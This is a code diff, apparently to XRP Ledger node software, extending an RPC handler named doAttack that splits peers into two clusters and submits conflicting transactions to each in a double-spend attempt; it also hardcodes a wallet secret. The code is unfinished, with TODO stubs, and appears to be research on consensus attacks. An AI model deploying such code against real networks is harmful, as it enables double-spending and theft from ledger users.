@@ -177,9 +177,13 @@ Json::Value doAttack (RPC::Context& context)
     JLOG (j.warn()) << "Starting doAttack";
     
     context.loadType = Resource::feeMediumBurdenRPC;
-    const auto active_peers = context.app.overlay ().getActivePeers();
+    const auto peers = context.app.overlay ().getActivePeers();             // store all peers (so we can connect again later)
+    const auto ledger = context.app.getLedgerMaster().getCurrentLedger();   // store current ledger to restore it later
     auto const failType = getFailHard (context);
+    auto& netOps = context.netOps;
     context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";
+
+    JLOG (j.warn()) << "Currently " << netOps.getLocalTxCount() << " transactions stored";
 
     // create tx and import into context.params['tx_json']:
     Json::Value tx;
@@ -191,25 +195,27 @@ Json::Value doAttack (RPC::Context& context)
     context.params[jss::tx_json] = tx;
 
     // Change peers to match only network-cluster 1
-    changePeers(context, active_peers, 1, j);
+    changePeers(context, peers, 1, j);
     // Add tx to Transaction Queue (TxQ) and view ?
     RPC::transactionSubmitAttack (
         context.params, failType, context.role,
         context.ledgerMaster.getValidatedLedgerAge(),
         context.app, RPC::getProcessTxnFnAttack (context.netOps));
 
+    JLOG (j.warn()) << "Currently " << netOps.getLocalTxCount() << " transactions stored";
+
     // Send all queued transactions
     sendQueuedTransactions(context, j);     // TODO
     
     // Remove all transactions from TxQ / view ?
-    // clearTxQ();        // TODO
+    clearTxQ(context, j);        // TODO
     
     // Change destination of tx -> this tx should be conflicting
     tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
     context.params[jss::tx_json] = tx;
 
     // Change peers to match only network-cluster 2
-    changePeers(context, active_peers, 2, j);
+    changePeers(context, peers, 2, j);
     // Add tx to Transaction Queue (TxQ) and view ?
     RPC::transactionSubmitAttack (
         context.params, failType, context.role,
@@ -220,7 +226,7 @@ Json::Value doAttack (RPC::Context& context)
     sendQueuedTransactions(context, j);     // TODO
 
     // Only connect to peers in cluster 1 (for debugging)
-    changePeers(context, active_peers, 1, j);
+    changePeers(context, peers, 1, j);
     return Json::Value();
 }
 
@@ -278,9 +284,8 @@ bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
     }
 }
 
-void clearTxQ(RPC::Context& context, beast::Journal j) {    // TODO
-    auto& txQ = context.app.getTxQ();
-    // auto& view = context.app.getView();
+void clearTxQ(RPC::Context& context, beast::Journal j) {
+    // TODO
 }
 // End attacker code
 
